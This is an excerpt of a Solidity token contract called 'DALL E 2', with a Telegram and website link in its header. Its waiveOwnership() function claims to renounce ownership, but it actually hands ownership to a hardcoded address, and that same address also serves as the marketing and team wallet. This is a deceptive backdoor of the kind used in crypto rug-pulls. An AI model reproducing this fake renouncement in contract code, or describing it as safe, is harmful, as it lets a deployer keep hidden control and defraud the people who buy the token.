...
/**
Telegram : https://t.me/+uwZX32V6u_YxZDQ0
Website: https://black-bird-1.site.xyz/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x2921C9F19c6F6474F0B95065072150AA146cCa83));
        _owner = address(0x2921C9F19c6F6474F0B95065072150AA146cCa83);
    }
...
contract DALLE2 is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "DALL E 2";
    string private _symbol = "DALLE AI";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x2921C9F19c6F6474F0B95065072150AA146cCa83);
    address payable private teamWalletAddress = payable(0x2921C9F19c6F6474F0B95065072150AA146cCa83);
